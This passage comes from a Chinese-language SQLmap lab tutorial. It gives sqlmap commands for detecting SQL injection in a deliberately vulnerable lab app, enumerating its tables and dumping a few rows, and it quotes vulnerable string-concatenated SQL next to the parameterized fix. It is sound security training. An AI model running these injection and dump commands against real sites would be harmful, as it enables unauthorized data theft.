  -u 'http://10.10.20.20:8089/user?id=1' \
  -p id \
  --batch \
  --level=1 \
  --risk=1 \
  --technique=B \
  --har=~/CyberLab/SQLmap/traffic/sqlmap-http.har
```

HAR 可在支持的浏览器开发工具、代理或分析工具中查看。

---

# 63. 保存 JSON Run Report

```bash
sqlmap \
  -u 'http://10.10.20.20:8089/user?id=1' \
  -p id \
  --batch \
  --level=1 \
  --risk=1 \
  --technique=BU \
  --report-json=~/CyberLab/SQLmap/results/sqlmap-run.json
```

查看：

```bash
python3 -m json.tool \
  ~/CyberLab/SQLmap/results/sqlmap-run.json |
less
```

如果 Kali 软件包版本不支持该参数：

```bash
sqlmap -hh |
grep report-json
```

以本机版本为准。

---

# 64. 自定义 Output Directory

```bash
sqlmap \
  -u 'http://10.10.20.20:8089/user?id=1' \
  -p id \
  --batch \
  --level=1 \
  --risk=1 \
  --technique=BU \
  --output-dir=~/CyberLab/SQLmap/results/sqlmap-output
```

SQLmap 会保存：

- Session
- Target 信息
- Dump 文件
- Log
- 结果文件

---

# 65. 完整证据命令

```bash
sqlmap \
  -u 'http://10.10.20.20:8089/user?id=1' \
  -p id \
  -A 'CyberLab-SQLmap/1.0' \
  --batch \
  --level=1 \
  --risk=1 \
  --technique=BU \
  --threads=1 \
  --delay=0.2 \
  --timeout=10 \
  --retries=1 \
  --output-dir=~/CyberLab/SQLmap/results/sqlmap-output \
  -t ~/CyberLab/SQLmap/traffic/sqlmap-http.txt \
  --har=~/CyberLab/SQLmap/traffic/sqlmap-http.har \
  --report-json=~/CyberLab/SQLmap/results/sqlmap-run.json
```

---

# 66. Session 缓存

SQLmap 会保存检测 Session。

再次运行相同目标时，可能看到：

```text
resuming back-end DBMS
resuming injection point
```

这能：

- 节省时间
- 减少重复请求
- 恢复枚举进度

但也可能让初学者误以为重新检测成功。

---

# 67. Flush Session

重新进行完整检测：

```bash
sqlmap \
  -u 'http://10.10.20.20:8089/user?id=1' \
  -p id \
  --flush-session \
  --batch \
  --level=1 \
  --risk=1 \
  --technique=BU
```

`--flush-session` 会清除当前目标的缓存信息。

---

# 68. Fresh Queries

```bash
--fresh-queries
```

表示：

```text
保留 Session
但当前运行不复用已保存的 Query Result
```

示例：

```bash
sqlmap \
  -u 'http://10.10.20.20:8089/user?id=1' \
  -p id \
  --fresh-queries \
  --batch \
  --tables
```

---

# 69. Batch 与 Answers

`--batch`：

```text
不等待用户输入
使用默认回答
```

需要覆盖某个问题时：

```bash
--answers='extending=N'
```

本课通常使用：

```text
--batch
```

不要在不理解默认选择时运行高风险命令。

---

# 70. Threads

SQLmap 默认最大并发通常为：

```text
1
```

本课保持：

```bash
--threads=1
```

Blind Data Retrieval 多线程会明显增加请求。

教学阶段不需要追求速度。

---

# 71. Delay、Timeout 与 Retries

```bash
--delay=0.2
--timeout=10
--retries=1
```

含义：

```text
每次请求之间暂停
单请求超时
超时重试次数
```

它们有助于：

- 控制服务器负载
- 减少日志爆发
- 方便 Wireshark 观察
- 避免长时间卡住

---

# 72. Time Limit

如果本机支持：

```bash
--time-limit=300
```

表示整个运行最多约 300 秒。

检查：

```bash
sqlmap -hh |
grep time-limit
```

示例：

```bash
sqlmap \
  -u 'http://10.10.20.20:8089/user?id=1' \
  -p id \
  --batch \
  --level=1 \
  --risk=1 \
  --technique=BU \
  --time-limit=300
```

---

# 73. String、Not-String 与 Code

Boolean Response 自动比较不稳定时，可指定 True 特征。

True 响应包含：

```text
student
```

命令：

```bash
sqlmap \
  -u 'http://10.10.20.20:8089/user?id=1' \
  -p id \
  --string='student' \
  --batch \
  --level=1 \
  --risk=1 \
  --technique=B
```

还可以使用：

```text
--not-string
--regexp
--code
```

只有在人工理解 True/False 响应后使用。

---

# 74. Parse Errors

实验应用会返回 SQLite 错误。

```bash
sqlmap \
  -u 'http://10.10.20.20:8089/user?id=1' \
  -p id \
  --parse-errors \
  --batch \
  --level=1 \
  --risk=1 \
  --technique=E
```

生产系统不应直接泄露数据库错误。

---

# 75. 为什么不使用 Tamper Scripts？

Tamper Script 会修改 Payload 形式。

常见用途包括尝试绕过：

- WAF
- 过滤器
- IDS 规则
- 输入检查

本课不使用：

```text
--tamper
```

原因：

```text
当前目标无需绕过
不学习规避检测
容易掩盖真正修复问题
```

---

# 76. 为什么不使用 Crawl 和 Bulk Scan？

SQLmap 支持：

```text
--crawl
-m target-list.txt
```

本课不使用，因为：

- 目标已经明确
- 参数已经明确
- Crawl 会扩大请求范围
- Bulk 容易误扫
- 结果更难验证

坚持：

```text
One URL
One Parameter
One Lab
```


---

# 77. 使用 tcpdump 实时观察 SQLmap

Kali 终端一：

```bash
sudo tcpdump \
  -i eth0 \
  -nn \
  -A \
  'host 10.10.20.20 and tcp port 8089'
```

Kali 终端二：

```bash
sqlmap \
  -u 'http://10.10.20.20:8089/user?id=1' \
  -p id \
  -A 'CyberLab-SQLmap-PCAP/1.0' \
  --batch \
  --level=1 \
  --risk=1 \
  --technique=B \
  --threads=1 \
  --delay=0.5
```

tcpdump 中可能看到：

```text
GET /user?id=...
User-Agent
SQL Payload
HTTP Status
JSON Response
SQLite Error
```

HTTP 8089 是明文，因此 Payload 和响应内容可能直接可见。

---

# 78. 保存 SQLmap PCAP

```bash
sudo tcpdump \
  -i eth0 \
  -nn \
  -s 0 \
  -w ~/CyberLab/SQLmap/captures/sqlmap-detection.pcap \
  'host 10.10.20.20 and tcp port 8089'
```

另一个终端运行：

```bash
sqlmap \
  -u 'http://10.10.20.20:8089/user?id=1' \
  -p id \
  -A 'CyberLab-SQLmap/1.0' \
  --batch \
  --level=1 \
  --risk=1 \
  --technique=BU \
  --threads=1 \
  --delay=0.2
```

完成后停止 tcpdump：

```text
Ctrl + C
```

---

# 79. 通过 Proxy 时的双段抓包

SQLmap 通过 Burp 或 ZAP：

```text
SQLmap
→ 127.0.0.1:8080
→ Proxy
→ 10.10.20.20:8089
```

抓本地 SQLmap 到 Proxy：

```bash
sudo tcpdump \
  -i lo \
  -nn \
  -s 0 \
  -w ~/CyberLab/SQLmap/captures/sqlmap-to-proxy.pcap \
  tcp port 8080
```

抓 Proxy 到 Ubuntu：

```bash
sudo tcpdump \
  -i eth0 \
  -nn \
  -s 0 \
  -w ~/CyberLab/SQLmap/captures/proxy-to-ubuntu.pcap \
  'host 10.10.20.20 and tcp port 8089'
```

---

# 80. Wireshark 分析

打开：

```bash
wireshark \
  ~/CyberLab/SQLmap/captures/sqlmap-detection.pcap
```

基础过滤：

```text
http
```

只看请求：

```text
http.request
```

目标：

```text
ip.addr == 10.10.20.20 &&
tcp.port == 8089
```

User-Agent：

```text
http.user_agent contains "SQLmap"
```

查询字符串：

```text
http.request.uri contains "/user"
```

响应错误：

```text
http.response.code == 500
```

---

# 81. Wireshark 中观察技术差异

Boolean-based 可能表现为：

```text
大量相似请求
Parameter 值不断变化
Response Size 在几个值之间变化
200 Response 为主
```

Error-based 可能表现为：

```text
特殊 Payload
500 Response
数据库错误正文
```

UNION-based 可能表现为：

```text
ORDER BY 或 UNION 相关输入
响应中出现额外数据
Response Size 明显变化
```

Time-based 可能表现为：

```text
请求与响应间隔明显增加
```

本课不默认运行 Time-based。

---

# 82. Wireshark 统计

打开：

```text
Statistics
→ HTTP
→ Requests
```

以及：

```text
Statistics
→ Conversations
```

记录：

| 阶段 | Requests | 200 | 500 | Duration |
|---|---:|---:|---:|---:|
| Manual curl |  |  |  |  |
| SQLmap B |  |  |  |  |
| SQLmap BU |  |  |  |  |
| Safe Endpoint |  |  |  |  |

---

# 83. Ubuntu Access Log

查看：

```bash
less ~/CyberLab/SQLmap/logs/access.log
```

只看 Kali：

```bash
grep '10.10.20.10' \
  ~/CyberLab/SQLmap/logs/access.log
```

只看 SQLmap User-Agent：

```bash
grep -i 'sqlmap' \
  ~/CyberLab/SQLmap/logs/access.log
```

只看 500：

```bash
grep '" 500 ' \
  ~/CyberLab/SQLmap/logs/access.log
```

统计请求：

```bash
grep -cE '"(GET|POST) ' \
  ~/CyberLab/SQLmap/logs/access.log
```

---

# 84. Access Log 的敏感性

SQLmap Payload 可能包含在 URL 中。

因此 Access Log 可能记录：

- SQL 语法
- Injection Payload
- 数据库名称
- 表和列名称
- 导出的测试值
- Cookie 或 Header

不要把完整日志上传到公开仓库。

---

# 85. Wazuh 日志链路

实验前在 Ubuntu：

```bash
logger -t sqlmap-lab \
  "Starting authorized SQLmap detection from Kali 10.10.20.10"
```

检测后：

```bash
logger -t sqlmap-lab \
  "Completed authorized SQLmap detection against TCP 8089"
```

枚举前：

```bash
logger -t sqlmap-lab \
  "Starting limited lab_users schema enumeration"
```

枚举后：

```bash
logger -t sqlmap-lab \
  "Completed limited lab_users schema enumeration"
```

---

# 86. Ubuntu 本地查看标记

```bash
journalctl \
  -t sqlmap-lab \
  --since "30 minutes ago"
```

Wazuh Dashboard：

```text
Threat Hunting
```

筛选：

```text
agent.name: ubuntu-target
```

搜索：

```text
sqlmap-lab
```

---

# 87. SQLmap 是否一定触发 Wazuh 告警？

不一定。

自动识别 SQLmap 通常需要：

- Web Access Log
- Wazuh Agent 收集日志
- SQLi Pattern Rule
- User-Agent Rule
- 请求频率分析
- WAF
- IDS/IPS
- Suricata
- Zeek

本课成功标准：

```text
SQLmap 能确认实验漏洞
Access Log 有请求
PCAP 有流量
Wazuh 能看到 sqlmap-lab 标记
```

---

# 88. 将自定义 Access Log 接入 Wazuh

当前文件：

```text
~/CyberLab/SQLmap/logs/access.log
```

默认不一定由 Wazuh 收集。

后续课程可配置：

```text
Wazuh localfile
Custom Decoder
Custom Rule
SQL Injection Detection
```

本课不要在未备份配置的情况下随意修改 Wazuh Manager。

---

# 89. Vulnerable Code 分析

危险代码：

```python
user_id = query.get("id", ["1"])[0]

sql = (
    "SELECT id, username, role, note "
    "FROM lab_users "
    f"WHERE id = {user_id}"
)
```

问题：

```text
user_id 直接成为 SQL 代码的一部分
```

应用无法区分：

```text
数据
SQL 运算符
SQL Keyword
SQL Comment
```

---

# 90. Parameterized Query

安全代码：

```python
connection.execute(
    """
    SELECT id, username, role, note
    FROM lab_users
    WHERE id = ?
    """,
    (user_id,),
)
```

这里：

```text
SQL 模板先定义
输入通过 Parameter 绑定
数据库把输入当作值
```

即使输入中包含：

```text
AND
OR
UNION
'
--
```

也不会自动成为 SQL 语法。

---

# 91. Parameterized Query 不是字符串清理

不推荐：

```python
value = value.replace("'", "")
```

也不推荐只屏蔽：

```text
UNION
SELECT
OR
--
```

原因：

- 编码变化
- 大小写变化
- 不同 DBMS 语法
- 不同输入上下文
- 过滤容易遗漏
- 可能破坏正常数据

主要修复：

```text
Parameterized Query
```

---

# 92. 输入验证的作用

输入验证仍然重要。

例如 ID 应是整数：

```python
try:
    user_id = int(raw_user_id)
except ValueError:
    return 400
```

作用：

- 拒绝无效业务输入
- 改善错误处理
- 减少攻击面
- 提供清晰 API Contract

但是：

```text
输入验证不能替代参数化查询
```

两者应一起使用。

---

# 93. Least Privilege

Web 应用数据库账号只应拥有必要权限。

例如读取用户列表的服务不应拥有：

- 创建管理员
- 删除数据库
- 写系统文件
- 创建扩展
- 执行系统命令
- 读取其他应用数据库

SQLite 是本地文件，没有传统数据库用户模型。

真实 MySQL/PostgreSQL/SQL Server 中必须实施：

```text
Least Privilege
```

---

# 94. 错误处理

危险响应：

```json
{
  "database_error": "...",
  "sql": "SELECT ..."
}
```

生产应用应返回：

```json
{
  "error": "Request could not be processed"
}
```

详细错误应：

- 写入受保护服务器日志
- 避免包含秘密
- 仅授权管理员可访问
- 配合 Trace ID
- 配置日志保留和监控

---

# 95. WAF 不是根本修复

WAF 可以：

- 阻挡部分 SQLi Pattern
- 限速
- 记录攻击
- 提供虚拟补丁

但 WAF 不能代替：

```text
Parameterized Queries
Secure Coding
Least Privilege
Testing
Patch Management
```

应用代码漏洞仍然存在。

---

# 96. 安全测试建议

开发流程中加入：

- Unit Test
- Integration Test
- SAST
- DAST
- Code Review
- Parameterized Query 标准
- Dependency Scan
- Pre-production ZAP/SQLmap 受控测试
- Logging 和 Alerting
- 修复后 Regression Test

---

# 97. 修复实验应用

复制：

```bash
cp \
  ~/CyberLab/SQLmap/server/sqlmap_lab.py \
  ~/CyberLab/SQLmap/server/sqlmap_lab_hardened.py
```

修改 Hardened 版本：

```text
PORT = 8090
```

把 Vulnerable Endpoint 改为参数化查询。

例如 `/user`：

```python
raw_user_id = query.get("id", ["1"])[0]

try:
    user_id = int(raw_user_id)
except ValueError:
    self.send_json(
        400,
        {"error": "id must be an integer"},
    )
    return

self.run_safe_query(
    """
    SELECT id, username, role, note
    FROM lab_users
    WHERE id = ?
    """,
    (user_id,),
)
```

同样修复：

```text
/search
/lookup
```

---

# 98. 启动 Hardened Server

```bash
python3 \
  ~/CyberLab/SQLmap/server/sqlmap_lab_hardened.py \
  2>&1 |
tee ~/CyberLab/SQLmap/logs/hardened-access.log
```

确认：

```bash
ss -lntp | grep ':8090'
```

---

# 99. 修复后手工复测

正常：

```bash
curl -sS \
  'http://10.10.20.20:8090/user?id=1'
```

Injection Input：

```bash
curl -i -G \
  --data-urlencode 'id=1 AND 1=1' \
  http://10.10.20.20:8090/user
```

预期：

```text
400
id must be an integer
```

---

# 100. 修复后 SQLmap 复测

```bash
sqlmap \
  -u 'http://10.10.20.20:8090/user?id=1' \
  -p id \
  --batch \
  --level=1 \
  --risk=1 \
  --technique=BU \
  --threads=1 \
  --flush-session \
  --output-dir=~/CyberLab/SQLmap/results/hardened-output
```

预期：

```text
id parameter does not appear to be injectable
```

---

# 101. Retest 注意事项

修复后必须使用：

```text
新的端口或 URL
新的 Output Directory
--flush-session
```

否则 SQLmap 可能恢复旧 Session，让结果混淆。

记录：

```text
Before URL
After URL
Before Result
After Result
Code Change
Manual Verification
SQLmap Retest
```

---

# 102. 完整实验一：GET Detection

1. 启动 Ubuntu 8089 Server。
2. Kali 手工请求 `id=1`。
3. 比较 `1 AND 1=1` 与 `1 AND 1=2`。
4. 运行：

```bash
sqlmap \
  -u 'http://10.10.20.20:8089/user?id=1' \
  -p id \
  --batch \
  --level=1 \
  --risk=1 \
  --technique=BU \
  --threads=1
```

5. 记录发现的 Technique 和 DBMS。

---

# 103. 完整实验二：POST 和 Raw Request

直接 POST：

```bash
sqlmap \
  -u 'http://10.10.20.20:8089/lookup' \
  --data='id=1' \
  -p id \
  --batch \
  --level=1 \
  --risk=1 \
  --technique=BU
```

Raw Request：

```bash
sqlmap \
  -r ~/CyberLab/SQLmap/requests/lookup-request.txt \
  -p id \
  --batch \
  --level=1 \
  --risk=1 \
  --technique=BU
```

比较两种方式。

---

# 104. 完整实验三：有限数据库枚举

按顺序：

```bash
--banner
```

```bash
--current-db
```

```bash
--tables
```

```bash
-D SQLite_masterdb -T lab_users --columns
```

```bash
-D SQLite_masterdb \
-T lab_users \
-C id,username,role \
--dump \
--start=1 \
--stop=4
```

只操作当前虚构数据库。

---

# 105. 完整实验四：证据记录

运行完整证据命令：

```bash
sqlmap \
  -u 'http://10.10.20.20:8089/user?id=1' \
  -p id \
  -A 'CyberLab-SQLmap/1.0' \
  --batch \
  --level=1 \
  --risk=1 \
  --technique=BU \
  --threads=1 \
  --delay=0.2 \
  --output-dir=~/CyberLab/SQLmap/results/evidence-output \
  -t ~/CyberLab/SQLmap/traffic/evidence-http.txt \
  --har=~/CyberLab/SQLmap/traffic/evidence-http.har \
  --report-json=~/CyberLab/SQLmap/results/evidence.json
```

同时保存 PCAP。

---

# 106. 完整实验五：Burp/ZAP 联动

1. 启动 Burp 或 ZAP，Listener `127.0.0.1:8080`。
2. SQLmap 加入：

```bash
--proxy='http://127.0.0.1:8080'
```

3. 在 Proxy History 中查看 Payload。
4. 导出一条 Request。
5. 使用 `-r` 再运行。
6. 对比 SQLmap Traffic File 与 Proxy History。

---

# 107. 完整实验六：Safe Endpoint

依次测试：

```text
/safe-user?id=1
/safe-search?name=student
POST /safe-lookup
```

使用：

```bash
--flush-session
```

确认 SQLmap 不报告注入。

对比 Vulnerable 与 Safe 代码。

---

# 108. 完整实验七：修复与复测

1. 创建 Hardened Server。
2. 使用端口 8090。
3. 修改所有 Query 为 Parameterized。
4. 手工测试正常输入。
5. 手工测试 Injection Input。
6. SQLmap 使用 `--flush-session`。
7. 保存 Hardened Report。
8. 比较 PCAP 和 Access Log。
9. 记录漏洞已修复或仍需处理。

---

# 109. 实验报告模板

## Lab Information

```text
Lab Name：SQLmap SQL Injection Assessment
Date：
Student：
Scanner：Kali-CyberLab 10.10.20.10
Target：Ubuntu-Target 10.10.20.20
Vulnerable URL：http://10.10.20.20:8089/
Hardened URL：http://10.10.20.20:8090/
Authorization：Personal CyberLab
SQLmap Version：
```

## Scope

```text
Included：
/user?id=
/search?name=
POST /lookup
对应 safe-* Endpoint

Excluded：
All other IPs and services
```

## Objective

```text
检测 GET 和 POST SQL Injection，
有限验证 SQLite Schema 和虚构测试数据，
修复字符串拼接并进行 Retest。
```

## Pre-Test Verification

```bash
# Ping
# nc
# Nmap
# curl baseline
# Manual true/false comparison
```

## SQLmap Configuration

```text
Level：
Risk：
Technique：
Threads：
Delay：
Timeout：
Retries：
Output Directory：
Traffic File：
HAR：
JSON Report：
```

## Injection Finding

```text
Parameter：
Location：GET / POST
Type：
Title：
Payload：
Back-end DBMS：
Evidence：
```

## Limited Enumeration

| Item | Result |
|---|---|
| DBMS |  |
| Database |  |
| Tables |  |
| lab_users Columns |  |
| Rows Retrieved |  |

## Validation

```text
Manual True Request：
Manual False Request：
Database Error：
Server Code：
Access Log：
PCAP：
Proxy History：
```

## Risk

```text
Potential Confidentiality Impact：
Potential Integrity Impact：
Potential Availability Impact：
Exposed Data：
Database Privilege Context：
```

## Root Cause

```text
User input was concatenated into SQL.
No parameter binding was used.
Detailed database errors were returned.
```

## Remediation

```text
Use parameterized queries.
Validate expected input type.
Apply least privilege.
Return generic client errors.
Secure detailed logs.
Add automated security tests.
Use WAF only as a secondary control.
```

## Retest

| Test | Before | After |
|---|---|---|
| Manual Boolean |  |  |
| SQLmap Detection |  |  |
| Error Disclosure |  |  |
| Normal Function |  |  |

## Evidence Files

```text
SQLmap Output：
Traffic TXT：
HAR：
JSON Report：
PCAP：
Access Log：
Wazuh Event：
Source Before：
Source After：
```

---

# 110. 常见错误与解决方法

## sqlmap command not found

```bash
sudo apt update
sudo apt install sqlmap
```

## Connection refused

Kali：

```bash
nc -zvn -w 3 10.10.20.20 8089
```

Ubuntu：

```bash
ss -lntp | grep ':8089'
```

## Parameter does not appear dynamic

手工比较：

```bash
curl 'http://10.10.20.20:8089/user?id=1'
curl 'http://10.10.20.20:8089/user?id=2'
```

确认不同值确实改变响应。

## Parameter does not appear injectable

检查：

- URL 是否使用 `/user`
- 是否误用 `/safe-user`
- `-p id` 是否正确
- 服务器是否运行原始脚本
- Session 是否混淆
- 是否使用错误 DBMS Hint
- Proxy 是否修改响应

重新运行：

```bash
--flush-session
```

## Response content is not stable

使用：

```text
--string
--not-string
--regexp
--code
```

先人工找到稳定的 True/False 特征。

本实验可使用：

```bash
--string='student'
```

## SQLmap 一直恢复旧结果

```bash
--flush-session
```

或使用新的：

```bash
--output-dir
```

## JSON Report 参数不存在

检查：

```bash
sqlmap -hh |
grep report-json
```

Kali 软件包可能落后于官方开发版本。

## Proxy Connection Error

确认 Burp/ZAP：

```text
Running
127.0.0.1:8080
```

检查：

```bash
ss -lntp | grep ':8080'
```

## Raw Request 无法读取

检查：

- 文件路径
- Host Header
- 空行
- Body
- Content-Type
- 文件编码
- Method 和 Path

## 数据库名称不同

使用 SQLmap 实际返回值。

SQLite 常见：

```text
SQLite_masterdb
main
```

不要机械复制名称。

## 扫描太慢

保持：

```text
--level=1
--risk=1
--technique=BU
--threads=1
```

不要为了速度直接升高线程或 Risk。

---

# 111. 结果可能变化的原因

SQLmap 结果会受以下影响：

- SQLmap 版本
- Payload 数据库
- Python 和 SQLite 版本
- HTTP Response 格式
- Session Cache
- Technique 设置
- Level 和 Risk
- Proxy 修改
- 网络延迟
- 应用错误处理
- 输入类型

报告必须记录：

```text
SQLmap Version
Command
Date
Target
Session State
Application Version
```

---

# 112. 敏感文件管理

以下文件可能包含敏感内容：

- SQLmap Output
- Dump
- Traffic TXT
- HAR
- JSON Report
- Raw Request
- Burp/ZAP History
- Access Log
- PCAP
- SQLite DB
- Source Code

公开前检查：

```bash
grep -RniE \
  'password|token|cookie|authorization|session|select|union' \
  ~/CyberLab/SQLmap
```

不要公开上传真实数据库数据。

---

# 113. 本课练习

1. 检查 SQLmap 版本和完整帮助。
2. 创建 Kali 和 Ubuntu 实验目录。
3. 创建 SQLite 实验应用。
4. 启动 8089 Server。
5. 查看 SQLite 测试数据。
6. 使用 curl 请求 `id=1`。
7. 手工比较 True 和 False。
8. 制造一次数据库错误。
9. 测试 `/safe-user`。
10. 运行第一条低风险 SQLmap 命令。
11. 记录 Injection Technique。
12. 记录 DBMS。
13. 使用 `--banner`。
14. 使用 `--current-db`。
15. 使用 `--tables`。
16. 查看 `lab_users` Columns。
17. 只导出四行实验数据。
18. 使用 `--where` 限制结果。
19. 测试 POST `/lookup`。
20. 使用 `--data`。
21. 创建 Raw Request。
22. 使用 `-r`。
23. 从 Burp 或 ZAP 导出请求。
24. 使用 `--proxy`。
25. 保存 Traffic TXT。
26. 保存 HAR。
27. 保存 JSON Report。
28. 使用自定义 Output Directory。
29. 观察 Session Resume。
30. 使用 `--flush-session`。
31. 使用 `--string=student`。
32. 运行 `--parse-errors`。
33. 保存 SQLmap PCAP。
34. 使用 Wireshark 统计请求。
35. 查看 Ubuntu Access Log。
36. 在 Wazuh 搜索 `sqlmap-lab`。
37. 测试三个 Safe Endpoint。
38. 创建 Hardened Server。
39. 修复字符串拼接。
40. 运行手工 Retest。
41. 运行 SQLmap Retest。
42. 完成实验报告。

---

# 114. 复习题

1. SQL Injection 的根本原因是什么？
2. SQLmap 的主要用途是什么？
3. `B` 表示什么技术？
4. `E` 表示什么技术？
5. `U` 表示什么技术？
6. `S` 表示什么技术？
7. `T` 表示什么技术？
8. `Q` 表示什么技术？
9. 为什么本课优先使用 `BU`？
10. `-u` 做什么？
11. `-p` 做什么？
12. `--level` 控制什么？
13. `--risk` 控制什么？
14. 为什么只使用 Risk 1？
15. `--batch` 做什么？
16. `--threads=1` 有什么好处？
17. `--delay` 做什么？
18. `-r` 做什么？
19. `--data` 做什么？
20. `--forms` 做什么？
21. `--banner` 做什么？
22. `--tables` 做什么？
23. `--columns` 做什么？
24. `--dump` 有什么风险？
25. 为什么使用 `--start` 和 `--stop`？
26. `-t` 保存什么？
27. `--har` 保存什么？
28. `--report-json` 保存什么？
29. `--output-dir` 做什么？
30. `--flush-session` 做什么？
31. `--fresh-queries` 做什么？
32. `--string` 有什么作用？
33. 为什么不使用 `--random-agent`？
34. 为什么不使用 Tamper Script？
35. 为什么参数化查询可以防止 SQLi？
36. 输入验证能替代参数化查询吗？
37. WAF 能作为根本修复吗？
38. 为什么 Access Log 可能敏感？
39. 为什么 SQLmap 不一定触发 Wazuh 告警？
40. 为什么修复后必须 Flush Session？
41. 为什么不能对未授权网站使用 SQLmap？

---

# 115. 参考答案

1. 用户输入被直接拼接成 SQL 代码。
2. 自动检测和验证 SQL Injection，并进行受控数据库枚举。
3. Boolean-based blind。
4. Error-based。
5. UNION query-based。
6. Stacked queries。
7. Time-based blind。
8. Inline queries。
9. 适合实验、请求相对可控，并避免默认慢速时间技术。
10. 指定目标 URL。
11. 指定要测试的参数。
12. 测试数量、边界和部分测试位置。
13. 测试风险类别。
14. 减少副作用和请求。
15. 非交互使用默认回答。
16. 降低并发和服务器负载。
17. 在请求之间等待。
18. 从文件加载 Raw HTTP Request。
19. 指定 POST Body。
20. 解析 HTML Form 并测试输入。
21. 获取 DBMS Banner。
22. 枚举数据库表。
23. 枚举表中的列。
24. 可能读取大量或敏感数据。
25. 限制数据行范围。
26. SQLmap 的 HTTP Request 和 Response 文本。
27. HTTP Archive。
28. 机器可读运行结果。
29. 自定义 Session 和结果目录。
30. 清除当前目标缓存。
31. 忽略已保存 Query Result，但保留 Session。
32. 指定 True Response 的稳定字符串。
33. 本课需要可识别、可审计的固定 User-Agent。
34. 本课不学习绕过 WAF 或检测。
35. 数据库驱动把输入绑定为值，而不是 SQL 语法。
36. 不能，两者应一起使用。
37. 不能，只是辅助控制。
38. 可能包含 Payload、参数、Cookie 和数据库线索。
39. 需要收集 Web 日志和对应规则。
40. 避免恢复旧漏洞结果。
41. 可能违法、读取数据或影响系统。

---

# 116. 命令速查表

## 基础检测

```bash
sqlmap \
  -u 'http://10.10.20.20:8089/user?id=1' \
  -p id \
  --batch \
  --level=1 \
  --risk=1 \
  --technique=BU
```

## POST

```bash
sqlmap \
  -u 'http://10.10.20.20:8089/lookup' \
  --data='id=1' \
  -p id \
  --batch \
  --level=1 \
  --risk=1 \
  --technique=BU
```

## Raw Request

```bash
sqlmap \
  -r request.txt \
  -p id \
  --batch \
  --level=1 \
  --risk=1 \
  --technique=BU
```

## DBMS Banner

```bash
sqlmap \
  -u 'http://10.10.20.20:8089/user?id=1' \
  -p id \
  --batch \
  --banner
```

## Tables

```bash
sqlmap \
  -u 'http://10.10.20.20:8089/user?id=1' \
  -p id \
  --batch \
  --tables
```

## Columns

```bash
sqlmap \
  -u 'http://10.10.20.20:8089/user?id=1' \
  -p id \
  --batch \
  -D SQLite_masterdb \
  -T lab_users \
  --columns
```

## 有限 Dump

```bash
sqlmap \
  -u 'http://10.10.20.20:8089/user?id=1' \
  -p id \
  --batch \
  -D SQLite_masterdb \
  -T lab_users \
  -C id,username,role \
  --dump \
  --start=1 \
  --stop=4
```

## Proxy

```bash
sqlmap \
  -u 'http://10.10.20.20:8089/user?id=1' \
  -p id \
  --proxy='http://127.0.0.1:8080' \
  --batch \
  --technique=B
```

## Traffic 和报告

```bash
sqlmap \
  -u 'http://10.10.20.20:8089/user?id=1' \
  -p id \
  --batch \
  -t traffic.txt \
  --har=traffic.har \
  --report-json=report.json \
  --output-dir=sqlmap-output
```

## 重新检测

```bash
sqlmap \
  -u 'http://10.10.20.20:8089/user?id=1' \
  -p id \
  --flush-session \
  --batch \
  --level=1 \
  --risk=1 \
  --technique=BU
```

---

# 117. 核心记忆口诀

```text
先手工比较
再 SQLmap 检测

-u：目标 URL
-p：测试参数
-r：读取 Raw Request
--data：POST Body
--level：测试数量
--risk：测试风险
--technique：选择技术
--batch：自动回答
--threads：限制并发
--delay：降低速度

--banner：数据库版本
--tables：表
--columns：列
--dump：数据
--start/--stop：限制行

-t：HTTP 文本证据
--har：HAR 证据
--report-json：JSON 结果
--output-dir：输出目录
--flush-session：清除旧缓存

发现不是结束
参数化查询才是修复
修复以后必须 Retest
```

---

# 118. 完成标准

完成本课后，你应该拥有：

```text
Ubuntu 8089 SQLmap 实验服务器
SQLite 测试数据库
手工 True/False 对比
GET Injection 检测
POST Injection 检测
Raw Request 文件
Burp/ZAP 导出请求
DBMS Banner
Table 和 Column 结果
四行有限测试 Dump
Traffic TXT
HAR
JSON Report
自定义 Output Directory
SQLmap PCAP
Wireshark 统计
Ubuntu Access Log
Wazuh sqlmap-lab 事件
Safe Endpoint 结果
Hardened 8090 Server
修复前后 SQLmap 对比
完整实验报告
```

检查 Kali：

```bash
find ~/CyberLab/SQLmap -type f
```

检查 Ubuntu：

```bash
find ~/CyberLab/SQLmap -type f
```

---

# 119. 下一课

下一课建议：

```text
Searchsploit
```

学习内容：

- Exploit-DB 本地索引
- 搜索软件和版本
- 阅读 Exploit Title、Path 和 Type
- 使用 `-x` 阅读代码
- 使用 `-m` 复制到实验目录
- 判断版本和平台是否匹配
- 区分 Exploit、PoC、DoS 和 Shellcode
- 不执行未知代码
- 静态代码审查
- 与 Nmap、WhatWeb 和 Nikto 结果联动
- Wazuh 观察实验文件活动

当前学习关系：

```text
Nmap：发现服务
Netcat：测试连接
Wireshark：图形化抓包
tcpdump：命令行抓包
curl：手动 HTTP 请求
WhatWeb：技术识别
Gobuster/ffuf：内容发现
Nikto：Web Server 检查
Burp Suite：手工代理分析
OWASP ZAP：代理、扫描和自动化
SQLmap：SQL Injection 检测与有限验证
```

---

# 120. 参考说明

本指南的 SQLmap 参数和概念依据：

```text
SQLmap 官方 GitHub 项目
SQLmap 官方 Usage Wiki
SQLmap 官方 Techniques Wiki
Kali Linux SQLmap 工具页面
本机 sqlmap -hh 输出
```

当前官方文档列出的 SQL Injection 技术字母为：

```text
B、E、U、S、T、Q
```

官方文档也说明：

```text
Level 1–5 控制测试数量
Risk 1–3 控制测试风险
-r 可加载 Raw HTTP Request
-t 可保存 HTTP Traffic
--har 可保存 HAR
--report-json 可保存 JSON Run Report
--dump-format 支持 CSV、HTML、SQLITE 和 JSONL
```

工具更新后，以你的 Kali 输出为准：

```bash
sqlmap --version
sqlmap -h
sqlmap -hh
```
